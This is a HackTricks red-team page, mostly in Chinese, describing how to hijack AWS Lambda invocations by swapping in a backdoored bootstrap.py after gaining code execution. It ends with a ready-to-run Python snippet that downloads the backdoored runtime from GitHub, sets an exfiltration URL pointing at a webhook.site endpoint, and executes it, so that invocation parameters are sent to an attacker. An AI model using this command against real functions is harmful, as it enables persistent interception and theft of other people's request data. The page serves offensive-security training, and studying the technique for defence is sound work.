# AWS - Steal Lambda Requests

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lambda Flow

<figure><img src="../../../../.gitbook/assets/image (341).png" alt=""><figcaption><p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png">https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/lambda_poc_2_arch.png</a></p></figcaption></figure>

1. **Slicer** 是容器外的一个进程，**发送** **调用** 到 **init** 进程。
2. init 进程监听端口 **9001**，暴露一些有趣的端点：
* **`/2018-06-01/runtime/invocation/next`** – 获取下一个调用事件
* **`/2018-06-01/runtime/invocation/{invoke-id}/response`** – 返回调用的处理响应
* **`/2018-06-01/runtime/invocation/{invoke-id}/error`** – 返回执行错误
3. **bootstrap.py** 有一个循环从 init 进程获取调用并调用用户代码处理它们 (**`/next`**)。
4. 最后，**bootstrap.py** 将 **响应** 发送给 init

注意，bootstrap 作为模块加载用户代码，因此用户代码执行的任何代码实际上都发生在这个进程中。

## Stealing Lambda Requests

此攻击的目标是让用户代码在处理易受攻击的请求的 **`bootstrap.py`** 进程内执行恶意的 **`bootstrap.py`** 进程。这样，**恶意的 bootstrap** 进程将开始 **与 init 进程通信** 以处理请求，而 **合法的** bootstrap 被 **困住** 运行恶意的，因此它不会向 init 进程请求请求。

由于用户代码由合法的 **`bootstrap.py`** 进程执行，因此实现这一目标很简单。所以攻击者可以：

* **向 init 进程发送当前调用的假结果**，使 init 认为 bootstrap 进程正在等待更多调用。
* 必须向 **`/${invoke-id}/response`** 发送请求
* 可以使用 [**inspect**](https://docs.python.org/3/library/inspect.html) python 模块（如[此处所提议](https://github.com/twistlock/lambda-persistency-poc/blob/master/poc/switch\_runtime.py)）从合法的 **`bootstrap.py`** 进程的堆栈中获取 invoke-id，或者再次请求 **`/2018-06-01/runtime/invocation/next`**（如[此处所提议](https://github.com/Djkusik/serverless\_persistency\_poc/blob/master/gcp/exploit\_files/switcher.py)）。
* 执行一个恶意的 **`bootstrap.py`** 来处理下一个调用
* 为了隐蔽性，可以将 lambda 调用参数发送到攻击者控制的 C2，然后按常规处理请求。
* 对于此攻击，只需从系统或 [**github**](https://github.com/aws/aws-lambda-python-runtime-interface-client/blob/main/awslambdaric/bootstrap.py) 获取原始的 **`bootstrap.py`** 代码，添加恶意代码并从当前的 lambda 调用中运行它。

### Attack Steps

1. 找到一个 **RCE** 漏洞。
2. 生成一个 **恶意的** **bootstrap**（例如 [https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py](https://raw.githubusercontent.com/carlospolop/lambda\_bootstrap\_switcher/main/backdoored\_bootstrap.py)）
3. **执行** 恶意的 bootstrap。

你可以轻松地通过运行以下操作来执行这些操作：
```bash
python3 <<EOF
import os
import urllib3

# Download backdoored bootstrap
http = urllib3.PoolManager()
backdoored_bootstrap_url = "https://raw.githubusercontent.com/carlospolop/lambda_bootstrap_switcher/main/backdoored_bootstrap.py"
new_runtime = http.request('GET', backdoored_bootstrap_url).data

# Load new bootstrap
os.environ['URL_EXFIL'] = "https://webhook.site/c7036f43-ce42-442f-99a6-8ab21402a7c0"

exec(new_runtime)
EOF
```
For more info check [https://github.com/carlospolop/lambda\_bootstrap\_switcher](https://github.com/carlospolop/lambda\_bootstrap\_switcher)

## 参考资料

* [https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/](https://unit42.paloaltonetworks.com/gaining-persistency-vulnerable-lambdas/)

{% hint style="success" %}
学习和练习 AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
学习和练习 GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过提交 PRs 分享 hacking 技巧到** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库。

</details>
{% endhint %}
